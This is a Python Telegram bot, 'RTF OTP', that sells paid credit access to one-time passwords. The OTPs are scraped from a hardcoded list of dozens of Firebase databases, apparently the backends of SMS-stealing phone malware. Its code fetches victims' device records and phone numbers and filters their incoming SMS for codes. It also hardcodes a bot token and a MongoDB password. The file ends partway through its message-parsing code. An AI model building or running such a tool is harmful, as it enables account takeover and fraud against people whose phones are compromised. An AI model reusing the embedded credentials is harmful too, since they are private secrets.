# ═════════════════════════════════════════════════════════════
#  ⚡ RTF GAMMING HEX — Credit Edition (MongoDB) + CUSTOM SMS
#  Full bot with credits, access, referrals, admin panel
#  Python 3.11+
#  pip install requests pymongo
# ═════════════════════════════════════════════════════════════

import logging
import os
import re
import time
import random
import json
import threading
import gc
import uuid
import html as html_mod
from datetime import datetime, timezone, timedelta
from urllib.parse import quote
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from http.server import BaseHTTPRequestHandler, HTTPServer

import requests
from requests.adapters import HTTPAdapter
import pymongo

# ══════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════

BOT_TOKEN   = "9287432863:AAFnQu9FyDzIJ637BdBjK9nDHIuPc_AFUPg"
OWNER_ID    = 6346250222
BOT_NAME    = "RTF OTP"

MONGODB_URL = "mongodb+srv://sahajada07:Sahajada123@cluster0.vynn0ht.mongodb.net/?appName=Cluster0"
DB_NAME     = "rtf_gammng_bot"

ADMIN_IDS = {6346250222}
UNLIMITED_IDS = {7516309870}

POLL_INTERVAL       = 2.0
DEVICE_ACTIVE_MIN   = 30
DEVICE_KEEP_HOURS   = 36
MSG_FETCH_LIMIT     = 20
PAGE_SIZE           = 8
WATCH_TIMEOUT_MIN   = 30
INVITE_RENEW_SECS   = 12 * 3600
CONCURRENT_POLLS    = 8
MONGO_TIMEOUT_MS    = 8000

FIND_REPEAT_WINDOW  = 30 * 60
CREDIT_HOURS = 1
ACCESS_BUFFER_SECS = 5

WELCOME_BONUS = 2

BUY_PACKAGES = {
    "pkg_10c":  {"credits": 10, "price": 10, "label": "10 Credits — ₹10"},
    "pkg_1d":   {"days": 1,     "price": 20, "label": "1 Day Unlimited — ₹20"},
    "pkg_life": {"lifetime": True, "price": 200, "label": "Lifetime — ₹200"},
}

# ── CUSTOM SMS CONFIG ──
CSM_MSG_TEXT      = "Hello, this is a verification message from RTF OTP service."
CSM_ACK_TIMEOUT   = 45
CSM_ACK_POLL_SECS = 2
CSM_SESSION_TTL   = 10 * 60

CHANNEL_FILE = Path("bot_data") / "channels.json"
channel_lock = threading.RLock()
force_channels = []

FORCE_JOIN_ENABLED = True
MIN_REFS = 0

GLOBAL_FBS = [
    "https://karuuuu890-e3374-default-rtdb.firebaseio.com",
    "https://ashish-36d11-default-rtdb.firebaseio.com",
    "https://sumittt-ad8de-default-rtdb.firebaseio.com",
    "https://planning-wit-ffeaa-default-rtdb.firebaseio.com",
    "https://rahul-f8fcd-default-rtdb.firebaseio.com",
    "https://bhai02-2abcd-default-rtdb.firebaseio.com",
    "https://repokuku-7a542-default-rtdb.firebaseio.com",
    "https://ashish-b238e-default-rtdb.firebaseio.com",
    "https://modiji-887e2-default-rtdb.firebaseio.com",
    "https://aperna-a63b8-default-rtdb.firebaseio.com",
    "https://rggrge-c0889-default-rtdb.firebaseio.com",
    "https://pikachu-650de-default-rtdb.firebaseio.com",
    "https://rahul-9003c-default-rtdb.firebaseio.com",
    "https://bhai-905b4-default-rtdb.firebaseio.com",
    "https://new-penal-1562b-default-rtdb.firebaseio.com",
    "https://jackie-7a125-default-rtdb.firebaseio.com",
    "https://kali-4610b-default-rtdb.firebaseio.com",
    "https://src-rto-chalan-3adcc-default-rtdb.firebaseio.com",
    "https://rto-yellow-default-rtdb.firebaseio.com",
    "https://lali-c74e2-default-rtdb.firebaseio.com",
    "https://rahulgandhi-feca5-default-rtdb.firebaseio.com",
    "https://anukumari-62dd5-default-rtdb.firebaseio.com",
    "https://yellow-e17c7-default-rtdb.firebaseio.com",
    "https://jaishreeram-5753e-default-rtdb.firebaseio.com",
    "https://dakubhai3-6b0fd-default-rtdb.firebaseio.com",
    "https://pohanji-geleri-default-rtdb.firebaseio.com",
    "https://uday-5dff3-default-rtdb.firebaseio.com",
    "https://mymp1oc-default-rtdb.firebaseio.com",
    "https://the-error-444-default-rtdb.firebaseio.com",
    "https://mogli-ade94-default-rtdb.firebaseio.com",
    "https://dogledost2-default-rtdb.firebaseio.com",
    "https://do-admin-v28-default-rtdb.firebaseio.com",
    "https://do-admin-v19-default-rtdb.firebaseio.com",
    "https://otp-work-b7716-default-rtdb.firebaseio.com",
    "https://manju-9dd86-default-rtdb.firebaseio.com",
    "https://hshsjs-9415c-default-rtdb.firebaseio.com",
    "https://pm-kisan-yojana2-default-rtdb.firebaseio.com",
    "https://apnare-25694-default-rtdb.firebaseio.com",
    "https://rameshwaram-f256a-default-rtdb.firebaseio.com",
    "https://anpu-b3595-default-rtdb.firebaseio.com",
    "https://surajn3-1f41b-default-rtdb.firebaseio.com",
    "https://deva-8c514-default-rtdb.firebaseio.com",
    "https://rohit-713b2-default-rtdb.firebaseio.com",
]

FB_CAP = 50 * 1024 * 1024
FB_TIMEOUT = 9
CACHE_TTL = 75
LIVE_SECS = 180
IST = timezone(timedelta(hours=5, minutes=30))

VIDEO_DIR = Path("videos")
VIDS_FILE = Path("bot_data") / "video_ids.json"
DATA = Path("bot_data")
S = "━"
DIV = "────────────────────"

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s",
                    handlers=[logging.StreamHandler(),
                              logging.FileHandler("rtfbot.log", encoding="utf-8")])
log = logging.getLogger("rtfbot")

sess = requests.Session()
sess.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
try:
    _adapter = HTTPAdapter(pool_connections=48, pool_maxsize=96, max_retries=0)
    sess.mount("https://", _adapter)
    sess.mount("http://", _adapter)
except Exception:
    pass

TG = "https://api.telegram.org/bot" + BOT_TOKEN

# ══════════════════════════════════════════════════════════════
#  WEB SERVER (Render Fix)
# ══════════════════════════════════════════════════════════════
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Bot is running perfectly!")
    def log_message(self, format, *args):
        pass

def run_web_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), HealthHandler)
    server.serve_forever()

# ══════════════════════════════════════════════════════════════
#  MONGODB SETUP
# ══════════════════════════════════════════════════════════════

sync_client = pymongo.MongoClient(MONGODB_URL, serverSelectionTimeoutMS=MONGO_TIMEOUT_MS)
sync_db = sync_client[DB_NAME]
sync_users = sync_db["users"]
sync_channels = sync_db["channels"]
sync_settings = sync_db["settings"]
sync_pending = sync_db["pending_payments"]

try:
    sync_pending.create_index([("status", 1), ("ts", -1)])
except Exception:
    pass

# ══════════════════════════════════════════════════════════════
#  EMOJI / FORMATTING
# ══════════════════════════════════════════════════════════════

def esc(t):
    return html_mod.escape(str(t)) if t is not None else ""

EMOJI_MAP = {
    "📢": "6305206294848475991", "📞": "5258337316715373336",
    "❓": "5436113877181941026", "ℹ️": "5420323339723881652",
    "🔧": "5341715473882955310", "👋": "6204139486671019705",
    "🔐": "5296369303661067030", "✅": "6275829594717165532",
    "📄": "5258477770735885832", "💯": "6275956313432266859",
    "⚡": "5456140674028019486", "📖": "5258328383183396223",
    "⚠️": "5274099962655816924", "🔄": "5030872266716480568",
    "❌": "6305324410744084248", "📊": "6204093414556834971",
    "💎": "5427168083074628963", "🔍": "5362061893605279054",
    "📅": "6235449188373502693", "📋": "5203910550542631009",
    "📌": "5397782960512444700", "👤": "6305229569276254220",
    "🆔": "6005835877337535334", "⭐": "4970181191958266458",
    "🚫": "5240241223632954241", "🛠️": "6235572922086331108",
    "🛠": "6235572922086331108", "🪪": "5890864241388293875",
    "📱": "6201882038975341348", "⏳": "5386367538735104399",
    "🔙": "6276030448862763508", "👉": "6305240074766259789",
    "🫡": "6305043124745934564", "👌": "5190447043545438788",
    "➕": "4956507094124594921", "🗑": "4958534924278694938",
    "👑": "6129705083501293112", "💬": "6129579597441801084",
    "🔗": "6129589862413638401", "🔥": "6129792056589031358",
    "✨": "6129479035077531636", "💰": "6123044667261981438",
    "💀": "6132184924603554220", "🚀": "6129639980387015660",
    "🥃": "6235620067942341623", "🍂": "6235717714023814969",
    "🤝": "5463256910851546817", "💵": "5197434882321567830",
    "🟢": "5416081784641168838", "🔴": "5411225014148014586",
    "🎉": "6129579803600231171", "🏆": "6156436440260549720",
    "🥇": "5440539497383087970", "🥈": "5447203607294265305",
    "🥉": "5453902265922376865", "📣": "6129433877791382400",
    "👻": "6129758830722030858", "🔒": "6129906126625447892",
    "🔓": "5465443379917629504",
}

EID = {"tick": "6275829594717165532", "bolt": "5456140674028019486",
       "search": "5362061893605279054", "gear": "6235572922086331108",
       "phone": "5258337316715373336", "fire": "6129792056589031358",
       "crown": "6129705083501293112", "link": "6129589862413638401",
       "rocket": "6129639980387015660", "hand": "5463256910851546817",
       "info": "5420323339723881652", "chart": "6204093414556834971",
       "doc": "5258477770735885832", "plus": "4956507094124594921",
       "warn": "5274099962655816924", "user": "6305229569276254220",
       "back": "6276030448862763508", "ok": "6275829594717165532",
       "skull": "6132184924603554220", "ghost": "6129758830722030858",
       "money": "6123044667261981438", "id": "6005835877337535334",
       "cal": "6235449188373502693", "mega": "6305206294848475991",
       "trash": "4958534924278694938", "lock": "5296369303661067030",
       "green": "5416081784641168838", "red": "5411225014148014586"}

def emo(e, key=None):
    if e in EMOJI_MAP:
        return f'<tg-emoji emoji-id="{EMOJI_MAP[e]}">{e}</tg-emoji>'
    if key and key in EID:
        return f'<tg-emoji emoji-id="{EID[key]}">{e}</tg-emoji>'
    return e

def sec(sym, title):
    return f"{S}[ {emo(sym)} <b>{title}</b> ]{S}"

def _clean_fallback(text):
    t = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', text)
    return esc(re.sub(r"<[^>]+>", "", t))

def _strip_icons(kb):
    if not kb:
        return kb
    import copy
    kb2 = copy.deepcopy(kb)
    for row in kb2.get("inline_keyboard", []):
        for b in row:
            b.pop("icon_custom_emoji_id", None)
    return kb2

def btn(text, cb=None, url=None, style=None, icon=None):
    b = {"text": text}
    if cb:    b["callback_data"] = cb
    if url:   b["url"] = url
    if style: b["style"] = style
    return b

def buttons(rows):
    return {"inline_keyboard": [[b for b in row if b] for row in rows]}

# ── API FUNCTIONS ──
def api(method, **data):
    data = {k: v for k, v in data.items() if v is not None}
    try:
        r = sess.post(f"{TG}/{method}", json=data, timeout=70)
        j = r.json()
    except Exception as e:
        log.warning(f"api {method}: EXC {e}")
        return None
    if not j.get("ok"):
        log.warning(f"api {method}: {j.get('description')}")
    return j

def send(cid, text, kb=None):
    r = api("sendMessage", chat_id=cid, text=text, parse_mode="HTML",
            reply_markup=kb, disable_web_page_preview=True)
    if r and not r.get("ok"):
        d = r.get("description", "")
        if "can't parse" in d or "unsupported" in d or "custom emoji" in d:
            r = api("sendMessage", chat_id=cid, text=_clean_fallback(text),
                    reply_markup=_strip_icons(kb), disable_web_page_preview=True)
    return r

def edit(cid, mid, text, kb=None):
    r = api("editMessageText", chat_id=cid, message_id=mid, text=text,
            parse_mode="HTML", reply_markup=kb, disable_web_page_preview=True)
    if r and not r.get("ok"):
        d = r.get("description", "")
        if "message is not modified" not in d and ("can't parse" in d or "unsupported" in d):
            r = api("editMessageText", chat_id=cid, message_id=mid,
                    text=_clean_fallback(text), reply_markup=_strip_icons(kb))
    return r

def answer_cb(qid, text=None, alert=False):
    p = {"callback_query_id": qid}
    if text: p["text"] = text
    if alert: p["show_alert"] = True
    api("answerCallbackQuery", **p)

def typing(cid):
    api("sendChatAction", chat_id=cid, action="typing")

def footer():
    return f"\n\n{S} {emo('⚡', 'bolt')} <b>{BOT_NAME}</b> {S}"

def b_back(cb="back"):
    return btn("ʙᴀᴄᴋ", cb, style="primary")

# ══════════════════════════════════════════════════════════════
#  USER DATABASE
# ══════════════════════════════════════════════════════════════

users_lock = threading.RLock()
user_cache = {}

def get_user_db(uid):
    uid = str(uid)
    try:
        u = sync_users.find_one_and_update(
            {"_id": uid},
            {"$setOnInsert": {
                "n": "", "u": "",
                "j": time.strftime("%d %b %Y"),
                "refs": [], "ref_by": "", "fbs": [], "banned": False,
                "credits": WELCOME_BONUS, "access_until": 0, "lifetime": False,
                "total_bought": 0, "total_spent": 0,
                "welcome_shown": False,
            }},
            upsert=True,
            return_document=pymongo.ReturnDocument.AFTER,
        )
        return u
    except Exception as e:
        log.error(f"get_user_db: {e}")
        return None

def update_user_db(uid, updates):
    uid = str(uid)
    try:
        sync_users.update_one({"_id": uid}, {"$set": updates}, upsert=True)
        if uid in user_cache:
            user_cache[uid].update(updates)
        return True
    except Exception as e:
        log.error(f"update_user_db: {e}")
        return False

def get_user_cached(uid):
    uid = str(uid)
    with users_lock:
        if uid not in user_cache:
            u = get_user_db(uid)
            if u is None:
                return {"_id": uid, "credits": 0, "access_until": 0,
                        "lifetime": False, "refs": [], "fbs": [],
                        "banned": False, "welcome_shown": False,
                        "_db_down": True}
            user_cache[uid] = u
        return user_cache[uid]

def refresh_user_cache(uid):
    uid = str(uid)
    u = get_user_db(uid)
    if u is not None:
        with users_lock:
            user_cache[uid] = u
    return u

# ══════════════════════════════════════════════════════════════
#  ACCESS / CREDITS
# ══════════════════════════════════════════════════════════════

def has_access(uid):
    try:
        if is_adm(uid) or is_unlimited(uid):
            return True
        u = get_user_cached(uid)
        if u.get("lifetime"):
            return True
        return time.time() < u.get("access_until", 0)
    except Exception:
        return False

def get_access_remaining(uid):
    try:
        if is_adm(uid) or is_unlimited(uid):
            return -1
        u = get_user_cached(uid)
        if u.get("lifetime"):
            return -1
        return max(0, int(u.get("access_until", 0) - time.time()))
    except Exception:
        return 0

def use_credit_for_access(uid, hours):
    uid = str(uid)
    now = time.time()
    try:
        res = sync_users.find_one_and_update(
            {"_id": uid, "credits": {"$gte": hours}},
            {"$inc": {"credits": -hours}},
            return_document=pymongo.ReturnDocument.AFTER,
        )
        if not res:
            u = sync_users.find_one({"_id": uid}) or {}
            return False, None, u.get("credits", 0)
        cur = sync_users.find_one({"_id": uid}) or {}
        current_until = max(now, cur.get("access_until", 0) or 0)
        new_until = current_until + hours * 3600
        sync_users.update_one(
            {"_id": uid},
            {"$max": {"access_until": new_until}},
        )
        refresh_user_cache(uid)
        u = get_user_cached(uid)
        return True, u.get("access_until", new_until), u.get("credits", 0)
    except Exception as e:
        log.error(f"use_credit_for_access: {e}")
        return False, None, None

def add_credits(uid, amount):
    uid = str(uid)
    try:
        res = sync_users.find_one_and_update(
            {"_id": uid},
            {"$inc": {"credits": amount, "total_bought": amount}},
            upsert=True,
            return_document=pymongo.ReturnDocument.AFTER,
        )
        if res is not None:
            with users_lock:
                user_cache[uid] = res
            return res.get("credits", 0)
    except Exception as e:
        log.error(f"add_credits: {e}")
    return get_user_cached(uid).get("credits", 0)

def fmt_remaining(secs):
    if secs < 0:
        return "UNLIMITED ♾️"
    if secs <= 0:
        return "EXPIRED"
    h = secs // 3600
    m = (secs % 3600) // 60
    if h > 0:
        return f"{h}h {m}m"
    return f"{m}m"

# ══════════════════════════════════════════════════════════════
#  ADMINS
# ══════════════════════════════════════════════════════════════

extra_admins = set()
ADM_FILE = DATA / "admins.json"

def _load_adms():
    global extra_admins
    if ADM_FILE.exists():
        try:
            extra_admins = {int(x) for x in json.loads(ADM_FILE.read_text(encoding="utf-8"))}
        except Exception:
            extra_admins = set()

def _save_adms():
    try:
        DATA.mkdir(exist_ok=True)
        ADM_FILE.write_text(json.dumps(sorted(extra_admins)), encoding="utf-8")
    except Exception:
        pass

def is_adm(uid):
    try:
        return int(uid) in ADMIN_IDS or int(uid) in extra_admins
    except Exception:
        return False

def is_unlimited(uid):
    try:
        return int(uid) in UNLIMITED_IDS
    except Exception:
        return False

# ══════════════════════════════════════════════════════════════
#  CHANNEL MANAGER
# ══════════════════════════════════════════════════════════════

def load_channels():
    global force_channels
    try:
        if CHANNEL_FILE.exists():
            force_channels = json.loads(CHANNEL_FILE.read_text(encoding="utf-8"))
    except Exception:
        force_channels = []

def save_channels():
    try:
        DATA.mkdir(exist_ok=True)
        with channel_lock:
            CHANNEL_FILE.write_text(json.dumps(force_channels, indent=2), encoding="utf-8")
    except Exception:
        pass

def ch_url(ch):
    if ch.get("url"):
        return ch["url"]
    if ch.get("invite_link"):
        return ch["invite_link"]
    try:
        r = api("getChat", chat_id=ch["id"])
        if r and r.get("ok"):
            un = (r["result"].get("username") or "").strip()
            if un:
                return f"https://t.me/{un}"
        r = api("createChatInviteLink", chat_id=ch["id"])
        if r and r.get("ok"):
            return r["result"].get("invite_link", "https://t.me/RTFGAMMING")
    except Exception:
        pass
    return "https://t.me/RTFGAMMING"

def renew_private_links():
    while True:
        try:
            time.sleep(INVITE_RENEW_SECS)
            with channel_lock:
                for ch in force_channels:
                    if ch.get("private") and ch.get("id"):
                        try:
                            r = api("createChatInviteLink", chat_id=ch["id"])
                            if r and r.get("ok"):
                                ch["invite_link"] = r["result"].get("invite_link")
                                ch["url"] = ch["invite_link"]
                                log.info(f"renewed invite for {ch['id']}")
                        except Exception:
                            pass
                save_channels()
        except Exception as e:
            log.error(f"renew_private_links: {e}")

_JOINED_STATES = ("member", "administrator", "creator")
_LEFT_STATES   = ("left", "kicked")

def _get_member_status(ch_id, user_id):
    last_desc = ""
    for attempt in range(2):
        r = api("getChatMember", chat_id=ch_id, user_id=user_id)
        if r is None:
            last_desc = "network"
            time.sleep(1.0)
            continue
        if r.get("ok"):
            st = (r.get("result") or {}).get("status", "")
            if st in _JOINED_STATES:
                return "joined", st
            if st in _LEFT_STATES:
                return "not_joined", st
            return "not_joined", st or "unknown"
        desc = r.get("description", "")
        last_desc = desc
        if ("chat not found" in desc.lower()
                or "member list" in desc.lower()
                or "not enough rights" in desc.lower()
                or "bot is not a member" in desc.lower()
                or "USER_NOT_PARTICIPANT" in desc.upper()):
            return "unknown", desc
        if "Too Many Requests" in desc:
            time.sleep(1.5)
            continue
        time.sleep(0.7)
    return "unknown", last_desc

def force_check(uid):
    try:
        uid = int(uid)
    except (TypeError, ValueError):
        return [], []
    missing = []
    unknown = []
    with channel_lock:
        chs = list(force_channels)
    for ch in chs:
        ch_id = ch.get("id")
        if not ch_id:
            continue
        label = ch.get("label", str(ch_id))
        status, detail = _get_member_status(ch_id, uid)
        if status == "joined":
            continue
        if status == "not_joined":
            missing.append(label)
        else:
            unknown.append((label, detail))
            log.warning(f"force_check unknown for channel {ch_id} ({label}): {detail}")
    return missing, unknown

def force_ok(uid):
    if not FORCE_JOIN_ENABLED or is_adm(uid) or is_unlimited(uid):
        return True
    missing, unknown = force_check(uid)
    if missing:
        return False
    if unknown:
        log.warning(f"force_ok: {len(unknown)} channel(s) unverifiable for uid {uid}")
    return True

def force_card(cid, u, missing_labels=None):
    uid = u.get("id")
    if missing_labels is None:
        missing_labels, unknown = force_check(uid)
    else:
        unknown = []

    with channel_lock:
        chs = list(force_channels)
    label_to_ch = {ch.get("label", str(ch.get("id"))): ch for ch in chs}

    rows = []
    for lbl in missing_labels:
        ch = label_to_ch.get(lbl)
        if ch:
            rows.append([btn(lbl, None, url=ch_url(ch), style="primary")])

    for lbl, reason in unknown:
        ch = label_to_ch.get(lbl)
        if ch:
            rows.append([btn(f"⚠️ {lbl} (unverifiable)", None, url=ch_url(ch), style="primary")])

    if not rows:
        send_home(cid, str(uid), u)
        return

    rows.append([btn("ᴠᴇʀɪꜰʏ", "verify", style="success")])

    send(cid, f"{sec('🔐', 'ᴊᴏɪɴ ᴛᴏ ᴜꜱᴇ ʙᴏᴛ')}\n{DIV}\n\n"
              f"<blockquote>{emo('👋')} ʜᴇʏ <b>{esc(u.get('first_name') or 'ᴜꜱᴇʀ')}</b>!\n"
              f"{emo('📢')} ʏᴏᴜ ᴏɴʟʏ ɴᴇᴇᴅ ᴛᴏ ᴊᴏɪɴ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ(s) ʙᴇʟᴏᴡ,\n"
              f"ᴛʜᴇɴ ᴛᴀᴘ <b>ᴠᴇʀɪꜰʏ</b>.</blockquote>" + footer(),
         buttons(rows))

# ══════════════════════════════════════════════════════════════
#  REFERRAL
# ══════════════════════════════════════════════════════════════

BOT_UN = "RTF_OTP"

def count_ref(new_user, referrer_id):
    referrer_id = str(referrer_id)
    new_uid = str(new_user["id"])
    try:
        r = sync_users.update_one(
            {"_id": referrer_id, "refs": {"$ne": new_uid}},
            {"$push": {"refs": new_uid}, "$inc": {"credits": 1}}
        )
        if r.modified_count == 0:
            return
        refresh_user_cache(referrer_id)
        u2 = sync_users.find_one({"_id": referrer_id}, {"refs": 1}) or {}
        total = len(u2.get("refs", []))
        send(int(referrer_id),
             f"{sec('🎉', 'ʏᴏᴜ ɢᴏᴛ ᴀ ʀᴇꜰᴇʀ')}\n{DIV}\n\n"
             f"{emo('👤')} <b>{esc(new_user.get('first_name') or 'ᴜꜱᴇʀ')}</b> ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n"
             f"{emo('💰')} <b>+1 Credit</b> added\n"
             f"{emo('🤝')} <b>ᴛᴏᴛᴀʟ ʀᴇꜰᴇʀs:</b> {total}" + footer())
    except Exception as e:
        log.error(f"count_ref: {e}")

def register_ref(u, rid):
    uid = str(u["id"])
    if not rid.isdigit() or rid == uid:
        return
    try:
        sync_users.update_one(
            {"_id": uid, "ref_by": ""},
            {"$set": {"ref_by": rid}},
            upsert=False
        )
        if uid in user_cache:
            user_cache[uid]["ref_by"] = rid
    except Exception as e:
        log.error(f"register_ref: {e}")

# ══════════════════════════════════════════════════════════════
#  FIREBASE ENGINE
# ══════════════════════════════════════════════════════════════

fb_cache = {}
fb_lock = threading.Lock()
fb_list_lock = threading.Lock()
GLOBAL_FB_LIST = list(GLOBAL_FBS)

def fb_get(base, path="", query="", timeout=FB_TIMEOUT, cap=FB_CAP):
    url = f"{base.rstrip('/')}/{path.strip('/')}/.json" if path else f"{base.rstrip('/')}/.json"
    if query:
        url += "?" + query
    try:
        r = sess.get(url, timeout=timeout, stream=True)
        cl = r.headers.get("Content-Length")
        if cl and cl.isdigit() and int(cl) > cap:
            r.close()
            return None, "TOO_LARGE"
        body = b""
        for chunk in r.iter_content(65536):
            body += chunk
            if len(body) > cap:
                r.close()
                return None, "TOO_LARGE"
        st = r.status_code
        if st in (401, 403):
            return None, "ACCESS_DENIED"
        if st == 404:
            return None, "NOT_FOUND"
        if st != 200:
            return None, f"HTTP {st}"
        text = body.decode("utf-8", "ignore").strip()
        if not text or text == "null":
            return None, "EMPTY"
        return json.loads(text), ""
    except requests.exceptions.Timeout:
        return None, "TIMEOUT"
    except Exception as e:
        return None, type(e).__name__

def _looks_like_clients(d):
    if not isinstance(d, dict):
        return False
    sample = list(d.values())[:5]
    return sample and all(isinstance(v, dict) for v in sample) and any(
        isinstance(v, dict) and ("status" in v or "mobNo" in v or "mobile" in v or "model" in v)
        for v in sample)

def fetch_clients(url):
    b, err = fb_get(url, "clients")
    if isinstance(b, dict) and b:
        return b, ""
    b2, err2 = fb_get(url, "devices")
    if isinstance(b2, dict) and b2:
        return b2, ""
    data, err3 = fb_get(url)
    if isinstance(data, dict) and data:
        for k in ("clients", "devices"):
            v = data.get(k)
            if isinstance(v, dict) and v:
                return v, ""
        if _looks_like_clients(data):
            return data, ""
    return None, err or err2 or err3

_DEV_KEYS = ("status", "number", "mobNo", "mob_no", "mobile",
             "phoneNumber", "phone", "modelName", "model", "deviceName", "name")

def _slim_clients(clients):
    if not isinstance(clients, dict):
        return {}
    out = {}
    for cid, info in clients.items():
        if isinstance(info, dict):
            out[cid] = {k: info[k] for k in _DEV_KEYS if k in info}
    return out

def refresh_fb(url):
    clients, err = fetch_clients(url)
    with fb_lock:
        fb_cache[url] = {"clients": _slim_clients(clients or {}), "t": time.time(), "ok": bool(clients)}
    return bool(clients), err

FB_POOL = ThreadPoolExecutor(12, thread_name_prefix="fb")
JOB_POOL = ThreadPoolExecutor(16, thread_name_prefix="job")

def refresh_pool(urls):
    list(FB_POOL.map(refresh_fb, urls))

def refresh_loop():
    while True:
        try:
            with fb_list_lock:
                urls = list(GLOBAL_FB_LIST)
            t0 = time.time()
            refresh_pool(urls)
            keep = set(urls)
            with fb_lock:
                for k in [k for k, v in fb_cache.items()
                          if k not in keep and time.time() - v.get("t", 0) > CACHE_TTL * 4]:
                    fb_cache.pop(k, None)
                if len(fb_cache) > 6000:
                    for k, _ in sorted(fb_cache.items(), key=lambda kv: kv[1].get("t", 0))[:len(fb_cache) - 6000]:
                        fb_cache.pop(k, None)
            gc.collect()
            log.info(f"fb refreshed {len(urls)} in {time.time()-t0:.1f}s (cached={len(fb_cache)})")
            _sweep_elapsed = time.time() - t0
        except Exception:
            log.exception("refresh loop")
            _sweep_elapsed = 0
        time.sleep(max(10.0, CACHE_TTL - _sweep_elapsed))

def user_fbs(uid):
    try:
        return list(get_user_cached(uid).get("fbs", []))
    except Exception:
        return []

def ensure_user_fbs(uid):
    for u in user_fbs(uid):
        with fb_lock:
            ent = fb_cache.get(u)
        if not ent or time.time() - ent["t"] > CACHE_TTL:
            refresh_fb(u)

def get_mob(info):
    raw = (info.get("number") or info.get("mobNo") or info.get("mob_no") or info.get("mobile")
           or info.get("phoneNumber") or info.get("phone") or "")
    digits = re.sub(r"\D", "", str(raw))
    if len(digits) == 12 and digits.startswith("91"):
        digits = digits[2:]
    elif len(digits) == 11 and digits.startswith("0"):
        digits = digits[1:]
    return digits if len(digits) == 10 and digits[0] in "6789" else ""

def dev_name(info, cid):
    for key in ("modelName", "model", "deviceName", "name"):
        v = info.get(key)
        if v and str(v).strip() and str(v) != "-":
            return str(v).strip()
    return str(cid)[:16]

def fb_short(url):
    s = url.replace("https://", "").replace("http://", "")
    s = re.sub(r"(-default-rtdb)?\.(firebaseio\.com|firebasedatabase\.app)", "", s)
    return s[:22]

def devices_index(uid=""):
    urls = []
    with fb_list_lock:
        urls.extend(GLOBAL_FB_LIST)
    if uid:
        urls.extend(user_fbs(uid))
    out = []
    with fb_lock:
        snap = {u: fb_cache.get(u) for u in urls}
    for url in urls:
        ent = snap.get(url)
        if not ent or not ent["ok"]:
            continue
        for cid, info in ent["clients"].items():
            if not isinstance(info, dict):
                continue
            phone = get_mob(info)
            if not phone:
                continue
            out.append({"url": url, "cid": str(cid), "phone": phone,
                        "online": info.get("status") is True,
                        "name": dev_name(info, cid)})
    return out

# ══════════════════════════════════════════════════════════════
#  MESSAGES / OTP
# ══════════════════════════════════════════════════════════════

def _promo_hit(m):
    try:
        b = json.dumps(m, ensure_ascii=False).upper()
    except Exception:
        b = str(m).upper()
    return (("PANNEL" in b) or ("NWQVM3" in b)
            or ("FREE FIREBASE AND OTP" in b) or ("PRIMEFREEOTPBOT" in b)
            or ("GOLDROP" in b) or ("GOLDDROP" in b)
            or ("GOLD DROP BOT" in b))

def _key_future(k):
    try:
        n = int(str(k))
    except (TypeError, ValueError):
        return False
    if n > 10 ** 12:
        n //= 1000
    if 10 ** 9 < n < 10 ** 11:
        return n > time.time() + 86400
    return False

def _is_future(m):
    if not isinstance(m, dict):
        return False
    for k in ("date", "time", "timestamp", "ts", "createdAt", "received_at", "sentTime"):
        v = m.get(k)
        if v is None:
            continue
        try:
            n = int(float(str(v).strip()))
        except (TypeError, ValueError):
            continue
        if n > 10 ** 12:
            n //= 1000
        if 10 ** 9 < n < 10 ** 11 and n > time.time() + 86400:
            return True
    return False

_PROMO_BLOCK_KW = ("T.ME/", "TELEGRAM.ME/", "JOIN NOW", "SUBSCRIBE", "FREE GOLD",
                   "GOLD DROP", "CLICK HERE", "FOLLOW US", "WHATSAPP CHANNEL",
                   "TELEGRAM CHANNEL", "FREE FIREBASE", "PANNEL", "PRIME FREE")
_OTP_CODE_RX = re.compile(r"(?<!\d)\d{4,8}(?!\d)")

def _dead_key(k, v):
    return _promo_hit(v) or _key_future(k) or _is_future(v)

def _is_otp_msg(m):
    if not isinstance(m, dict):
        return False
    body = msg_body(m)
    if not body:
        return False
    b = body.upper()
    if "T.ME/LOGIN/" in b:
        pass
    elif any(w in b for w in _PROMO_BLOCK_KW):
        return False
    if ("HTTP" in b or "WWW." in b) and any(
            w in b for w in ("JOIN", "FREE", "BOT", "SUBSCRIBE", "CHANNEL", "OFFER")):
        return False
    if not _OTP_CODE_RX.search(body):
        return False
    return bool(msg_otp(body))

def _show_key(k, v):
    if not isinstance(v, dict):
        return False
    if _dead_key(k, v):
        return False
    return _is_otp_msg(v)

def fetch_msgs(url, cid, limit=5):
    win = max(int(limit) * 12, 60)
    data, _ = fb_get(url, f"messages/{cid}", query=f'orderBy="$key"&limitToLast={win}')
    if not isinstance(data, (dict, list)) or (isinstance(data, dict) and not data):
        data, _ = fb_get(url, f"messages/{cid}")
    if not isinstance(data, (dict, list)):
        return []

    def tok(k):
        s = str(k)
        try:
            return (0, int(s), "")
        except (TypeError, ValueError):
            return (1, 0, s)

    if isinstance(data, list):
        items = [(str(i), v) for i, v in list(enumerate(data)) if isinstance(v, dict)]
        dead = [k for k, v in items if _dead_key(k, v)]
        clean = [(k, v) for k, v in items if _show_key(k, v)]
        return clean[-int(limit):][::-1]

    def partition(d):
        dead = [str(k) for k, v in d.items()
                if isinstance(v, dict) and _dead_key(str(k), v)]
        show = sorted([k for k, v in d.items()
                       if isinstance(v, dict) and _show_key(str(k), v)],
                      key=tok, reverse=True)
        return dead, show

    dead_keys, clean_keys = partition(data)
    if len(clean_keys) < int(limit) and len(data) >= win:
        all_data, _ = fb_get(url, f"messages/{cid}")
        if isinstance(all_data, dict) and all_data:
            data = all_data
            dead_keys, clean_keys = partition(data)
    return [(str(k), data[k]) for k in clean_keys[:int(limit)]]

def msg_body(m):
    for key in ("body", "message", "msg", "text", "content", "sms", "smsBody",
                "messageBody", "SMS", "msgBody"):
        v = m.get(key)
        if v is not None and str(v).strip():
            return str(v).strip()
